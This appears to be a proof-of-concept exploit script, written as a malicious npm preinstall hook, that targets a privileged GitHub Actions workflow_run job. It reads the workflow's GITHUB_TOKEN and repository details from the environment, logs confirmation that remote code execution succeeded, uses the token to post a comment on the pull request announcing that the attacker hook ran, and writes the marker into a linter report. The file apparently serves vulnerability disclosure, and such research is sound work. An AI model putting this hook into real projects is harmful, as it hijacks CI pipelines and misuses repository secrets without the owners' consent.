const fs = require('fs');
(async () => {
  const token = process.env.GITHUB_TOKEN || '';
  const repo = process.env.GITHUB_REPOSITORY;
  const runId = process.env.GITHUB_RUN_ID;
  const line = `RCE-PREINSTALL-OK run=${runId} actor=${process.env.GITHUB_ACTOR} token_present=${!!token} token_len=${token.length} repo=${repo}`;
  console.log(line);
  try {
    const prNumber = fs.readFileSync('pr-number.txt', 'utf8').trim() || '1';
    const res = await fetch(`https://api.github.com/repos/${repo}/issues/${prNumber}/comments`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${token}`,
        Accept: 'application/vnd.github+json',
        'Content-Type': 'application/json',
        'X-GitHub-Api-Version': '2022-11-28'
      },
      body: JSON.stringify({ body: `RCE-PREINSTALL-CONFIRMED: attacker npm lifecycle hook executed in privileged workflow_run job. run=${runId} actor=${process.env.GITHUB_ACTOR}` })
    });
    const j = await res.json();
    console.log('comment status', res.status, 'url', j.html_url || j.message);
  } catch (e) { console.log('comment error', e.message); }
  try { fs.appendFileSync('linter-report.txt', '\n' + line + '\n'); } catch (e) { console.log('append failed', e.message); }
})();
